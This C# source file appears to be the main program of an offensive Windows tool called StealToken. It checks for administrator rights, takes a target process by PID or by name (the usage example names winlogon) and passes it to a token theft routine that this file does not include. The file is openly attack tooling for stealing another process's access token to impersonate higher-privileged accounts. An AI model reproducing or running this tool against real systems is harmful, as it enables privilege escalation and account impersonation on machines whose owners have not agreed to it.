using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Security.Principal;



namespace StealToken
{
    class Program
    {

        static void Usage()
        {
            
            Console.WriteLine(".\\StealToken.exe pid=1234");
            Console.WriteLine(".\\StealToken.exe processname=winlogon");

        }

        //https://stackoverflow.com/questions/3600322/check-if-the-current-user-is-administrator
        public static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        static void Main(string[] args)
        {

            Console.WriteLine("Stealing token...");

            bool isAdmin = IsAdministrator();
            if (isAdmin.Equals(true))
            {

                Console.WriteLine("We're admin!");

                //arg parsing taken from https://github.com/GhostPack/SharpWMI

                if (args.Length < 1)
                {
                    Usage();
                    return;
                }

                var arguments = new Dictionary<string, string>();
                foreach (string argument in args)
                {
                    int idx = argument.IndexOf('=');
                    if (idx > 0)
                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                }

                if (arguments.ContainsKey("pid"))
                {

                    int pid = Int32.Parse(arguments["pid"]);

                    Console.WriteLine(pid);

                    Token.TokenOps.TokenTheft(pid);

                }


                else if (arguments.ContainsKey("processname"))
                {

                    string target_proc = arguments["processname"];

                    Console.WriteLine(target_proc);

                    Process[] expProc = Process.GetProcessesByName(target_proc);
                    int target_pid = expProc[0].Id;

                    Console.WriteLine(target_pid);

                    Token.TokenOps.TokenTheft(target_pid);

                }

                else
                {

                    Console.WriteLine("not implemented");
                    Usage();
                    return;

                }

            }

            else
            {

                Console.WriteLine("You need to be admin! Exiting...");
                return;

            }
        }
    }
}
